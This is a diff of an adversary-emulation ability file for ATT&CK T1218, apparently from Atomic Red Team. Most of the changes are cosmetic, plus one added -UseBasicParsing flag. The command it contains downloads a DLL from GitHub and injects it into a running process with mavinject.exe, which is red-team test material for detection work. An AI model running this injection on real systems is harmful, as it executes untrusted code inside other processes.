@@ -5,15 +5,15 @@
   tactic: stealth
   technique:
     attack_id: T1218
-    name: Signed Binary Proxy Execution
+    name: System Binary Proxy Execution
   platforms:
     windows:
       sh:
         command: 'if (Test-Path "PathToAtomicsFolder\T1218\src\x64\T1218.dll") {exit
           0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1218\src\x64\T1218.dll")
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll"
-          -OutFile "PathToAtomicsFolder\T1218\src\x64\T1218.dll"; fi; mavinject.exe
-          1000 /INJECTRUNNING "PathToAtomicsFolder\T1218\src\x64\T1218.dll"'
+          -OutFile "PathToAtomicsFolder\T1218\src\x64\T1218.dll" -UseBasicParsing;
+          fi; mavinject.exe 1000 /INJECTRUNNING "PathToAtomicsFolder\T1218\src\x64\T1218.dll"'
         elevation_required: true
   plugin: atomic
   singleton: false
@@ -21,9 +21,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - t1218
-  - atomic-red-team
   - stealth
+  - atomic-red-team
+  - t1218
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -46,9 +46,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll"
-        -OutFile "#{dll_payload}"
+        -OutFile "#{dll_payload}" -UseBasicParsing
 
         '
     technique_created: '2018-04-18T17:59:24.739Z'
     atomic_guid: c426dacf-575d-4937-8611-a148a86a5e61
-    import_timestamp: '2026-10-20T07:08:26.552596Z'
+    import_timestamp: '2026-10-21T07:01:49.326980Z'
